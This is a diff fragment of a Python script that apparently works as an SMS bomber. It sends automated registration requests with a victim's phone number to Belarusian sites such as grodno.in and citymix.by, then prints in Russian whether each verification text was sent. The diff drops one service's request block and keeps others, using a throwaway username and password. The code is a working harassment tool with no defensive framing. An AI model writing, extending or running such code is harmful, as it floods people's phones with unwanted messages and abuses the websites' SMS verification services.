@@ -275,25 +275,6 @@ else:
     print(Fore.RED + "Смс от mila не отправлено!")
 
 
-dates = {
-    "ajax": "register",
-    "user": "ivanovivan4ik",
-    "pass": "123321123Eg",
-    "phone_country": "+375",
-    "accept": "1",
-    "phone_code": f"{phone[4:7]}",
-    "phone_number": f"{phone[7:]}",
-    "resend": "1",
-    "code": ""
-}
-
-response = requests.post('https://grodno.in/register/', data=dates, headers=headers1)
-if response.status_code == 200:
-    print(Fore.GREEN + "Смс от grodno.in отправлено!")
-else:
-    print(Fore.RED + "Смс от grodno.in не отправлено!")
-
-
 response = requests.post('https://api.citymix.by/auth/register', json={"phone":f"{phone}","password":"123321123Eg","code":"","resend":1}, headers=headers1)
 if response.status_code == 200:
     print(Fore.GREEN + "Смс от citymix отправлено!")
